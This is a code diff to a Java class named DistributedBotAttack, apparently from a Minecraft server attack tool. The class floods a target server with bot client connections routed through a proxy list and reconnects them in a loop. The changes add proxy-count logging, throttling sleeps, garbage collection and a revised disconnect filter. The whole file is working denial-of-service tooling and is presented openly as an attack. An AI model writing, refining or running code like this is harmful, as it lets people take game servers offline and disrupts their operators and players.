@@ -1,7 +1,5 @@
 package me.alikomi.endminecraft.tasks.attack;
 
-import ch.jamiete.mcping.MinecraftPing;
-import ch.jamiete.mcping.MinecraftPingOptions;
 import me.alikomi.endminecraft.utils.Util;
 import org.spacehq.mc.protocol.MinecraftProtocol;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
@@ -23,14 +21,13 @@ public class DistributedBotAttack extends Util {
     private static int port;
     private static long time;
     private static int sleepTime;
-    private static Map<String, Proxy.Type> ips;
+    private Map<String, Proxy.Type> ips;
     private static boolean enableTab;
     private static Lock lock = new ReentrantLock();
-    private static HashMap<String, Client> connects = new HashMap<>();
+    private HashMap<String, Client> connects = new HashMap<>();
     private static boolean isAttack = true;
     private static int index = 0;
     private static List<String> ipsKey;
-    private static int ic = 0;
 
 
     public DistributedBotAttack(String ip, int port, long time, int sleepTime, Map<String, Proxy.Type> ips, boolean enableTab) {
@@ -45,6 +42,7 @@ public class DistributedBotAttack extends Util {
 
     public boolean startAttack() {
         log(ips);
+        log("代理数量： " +ips.size());
         log("正在初始化...");
         ips.forEach((po, tp) -> {
             if (po.contains(":")) {
@@ -59,6 +57,7 @@ public class DistributedBotAttack extends Util {
                 c.getSession().connect();
             }));
         }
+        log("初始化完毕..正在启动");
 
         li.forEach((t) -> {
             t.start();
@@ -155,9 +154,8 @@ public class DistributedBotAttack extends Util {
 
             public void disconnected(DisconnectedEvent disconnectedEvent) {
                 String msg = disconnectedEvent.getReason();
-                if (msg.contains("refused") || msg.contains("InternalError") || msg.contains(ip) || msg.contains("closed") || !isAttack)
-                    return;
-                log("用户 " + mc.getProfile().getName() + "断开连接： " + disconnectedEvent.getReason());
+                if (msg.contains("refused") ||msg.contains("here") || !isAttack) return;
+                log("用户 " + mc.getProfile().getName() + "断开连接： " + msg);
             }
         });
         return client;
@@ -170,9 +168,7 @@ public class DistributedBotAttack extends Util {
                 try {
                     connects.forEach((k, v) -> {
                         if (v != null && v.getSession() != null) {
-                            if (v.getSession().isConnected()) {
-                                ic++;
-                            } else {
+                            if (! v.getSession().isConnected()) {
                                 list.add(k);
                             }
                         } else {
@@ -186,6 +182,7 @@ public class DistributedBotAttack extends Util {
                 lock.lock();
                 list.forEach((s -> connects.remove(s)));
                 lock.unlock();
+                System.gc();
                 try {
                     Thread.sleep(2700);
                 } catch (InterruptedException e) {
@@ -260,6 +257,11 @@ public class DistributedBotAttack extends Util {
                             c.getSession().setWriteTimeout(3500);
                             c.getSession().connect();
                         }).start();
+                        try {
+                            Thread.sleep(sleepTime);
+                        } catch (InterruptedException e) {
+                            e.printStackTrace();
+                        }
                     }
                 }
             }
